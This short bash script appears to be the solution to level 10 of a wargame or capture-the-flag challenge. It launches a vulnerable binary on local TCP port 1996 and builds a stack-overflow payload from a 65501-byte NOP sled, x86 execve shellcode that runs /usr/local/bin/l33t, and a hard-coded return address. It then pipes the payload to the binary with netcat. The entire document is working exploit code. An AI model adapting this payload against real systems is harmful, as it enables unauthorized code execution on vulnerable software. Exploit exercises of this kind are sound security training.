#!/bin/bash

# Run the vulnerable program with the specific TCP option in the background
/var/challenge/level10/10 -t tcp -p 1996 &

# Craft a payload using Python to send to the vulnerable program
# NOP sleds + shellcode + address of shellcode + new-line character to adhere to the rules of 10.c
payload=$(python -c \
    'print "\x90" * 65501 + \
    "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80" + \
    "\xe8\xe6\xff\xff\xff/usr/local/bin/l33t" + \
    "\xa9\xff\xff\xbf\x0a"')

# Use netcat to send the payload to the vulnerable program
echo "$payload" | nc 127.0.0.1 1996